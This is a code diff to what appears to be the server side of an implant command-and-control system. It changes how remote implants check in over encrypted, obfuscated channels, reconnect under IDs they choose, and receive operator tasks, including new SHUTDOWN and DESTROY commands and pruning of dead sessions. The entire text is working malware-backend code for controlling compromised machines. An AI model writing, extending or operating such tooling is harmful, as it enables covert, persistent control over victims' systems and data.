@@ -108,6 +108,7 @@ class ImplantSession(object):
         self.imp_pub = imp_pub
         self.info = info
         self.task_queue = queue.Queue()
+        self.alive = True
 
     def _push(self, command, payload):
         req = {
@@ -136,7 +137,18 @@ def _handle_implant(conn, addr):
         msg = json.loads(decrypt_message(deobfuscate(raw), priv_key).decode())
         info = msg.get("payload", {})
 
-        implant_id = "IMP-" + str(uuid.uuid4())[:8].upper()
+        requested_id = info.pop("implant_id", None)
+        if requested_id:
+            implant_id = requested_id
+            with _sessions_lock:
+                if implant_id in _sessions:
+                    try:
+                        _sessions[implant_id].conn.close()
+                    except Exception:
+                        pass
+                    _sessions.pop(implant_id, None)
+        else:
+            implant_id = "IMP-" + str(uuid.uuid4())[:4].upper()
         session = ImplantSession(implant_id, conn, priv_key, imp_pub, info)
 
         ack = {
@@ -159,12 +171,20 @@ def _handle_implant(conn, addr):
             try:
                 result = session._push(command, payload)
                 log.info("  TASK     %s  %s  OK", implant_id, command)
-                result_q.put({"status": "ok", "result": result})
-                if command == "SHUTDOWN":
+                if command in ("SHUTDOWN", "DESTROY"):
+                    with _sessions_lock:
+                        _sessions.pop(implant_id, None)
+                    result_q.put({"status": "ok", "result": result})
                     break
+                result_q.put({"status": "ok", "result": result})
             except (ConnectionError, OSError, BrokenPipeError) as exc:
                 log.info("  TASK     %s  %s  SOCKET_DEAD %s", implant_id, command, exc)
-                result_q.put({"status": "error", "message": "socket closed: {0}".format(exc)})
+                with _sessions_lock:
+                    _sessions.pop(implant_id, None)
+                if command in ("SHUTDOWN", "DESTROY"):
+                    result_q.put({"status": "ok", "result": {"type": "RESPONSE", "payload": {"message": "implant disconnected"}}})
+                else:
+                    result_q.put({"status": "error", "message": "socket closed: {0}".format(exc)})
                 break
             except Exception as exc:
                 log.info("  TASK     %s  %s  ERR %s", implant_id, command, exc)
@@ -176,6 +196,7 @@ def _handle_implant(conn, addr):
         with _sessions_lock:
             dead = [k for k, v in list(_sessions.items()) if v.conn is conn]
             for k in dead:
+                _sessions[k].alive = False
                 _sessions.pop(k, None)
                 log.info("- IMPLANT  %s  disconnected", k)
         conn.close()
@@ -206,6 +227,10 @@ def _handle_operator(conn, addr):
 
             if action == "LIST":
                 with _sessions_lock:
+                    dead = [iid for iid, s in list(_sessions.items()) if not s.alive]
+                    for iid in dead:
+                        _sessions.pop(iid, None)
+                        log.info("- IMPLANT  %s  pruned (dead)", iid)
                     result = {
                         "status": "ok",
                         "implants": {iid: s.info for iid, s in _sessions.items()},
